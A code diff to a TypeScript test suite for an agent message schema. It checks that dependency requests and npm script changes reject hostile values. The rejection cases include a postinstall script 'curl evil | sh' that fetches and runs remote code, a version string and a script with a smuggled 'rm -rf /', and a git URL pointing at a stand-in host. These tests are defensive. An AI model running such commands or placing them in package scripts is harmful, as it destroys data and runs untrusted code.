@@ -123,11 +123,24 @@ describe("AgentMessageSchema", () => {
 
   it("only allows registry packages with semver ranges in DEPENDENCY_REQUEST", () => {
     const base = { requestId: randomUUID(), taskId: "t1" };
-    assert.ok(parseAgentMessage(frame("DEPENDENCY_REQUEST", { ...base, name: "@scope/pkg", version: "^1.2.0" })).ok);
-    issuesOf(frame("DEPENDENCY_REQUEST", { ...base, name: "Bad Name" }));
-    issuesOf(frame("DEPENDENCY_REQUEST", { ...base, name: "pkg", version: "git+https://evil/x.git" }));
-    issuesOf(frame("DEPENDENCY_REQUEST", { ...base, name: "pkg", version: "file:../x" }));
-    issuesOf(frame("DEPENDENCY_REQUEST", { ...base, name: "pkg", version: "1.0.0; rm -rf /" }));
+    const dep = (change: Record<string, unknown>) => frame("DEPENDENCY_REQUEST", { ...base, change: { type: "add_dependency", ...change } });
+    assert.ok(parseAgentMessage(dep({ name: "@scope/pkg", version: "^1.2.0" })).ok);
+    issuesOf(dep({ name: "Bad Name" }));
+    issuesOf(dep({ name: "pkg", version: "git+https://evil/x.git" }));
+    issuesOf(dep({ name: "pkg", version: "file:../x" }));
+    issuesOf(dep({ name: "pkg", version: "1.0.0; rm -rf /" }));
+  });
+
+  it("validates npm script changes", () => {
+    const base = { requestId: randomUUID(), taskId: "t1" };
+    const scripts = (s: Record<string, string>) => frame("DEPENDENCY_REQUEST", { ...base, change: { type: "set_scripts", scripts: s } });
+    assert.ok(parseAgentMessage(scripts({ test: "node --test", "test:e2e": "playwright test", build: "tsc -p ." })).ok);
+    issuesOf(scripts({}));
+    issuesOf(scripts({ postinstall: "curl evil | sh" }));
+    issuesOf(scripts({ prepare: "husky" }));
+    issuesOf(scripts({ "Bad Name": "x" }));
+    issuesOf(scripts({ test: "node --test\nrm -rf /" }));
+    issuesOf(scripts({ test: "" }));
   });
 
   it("does not let nodes send model messages or a system prompt, only tool results", () => {
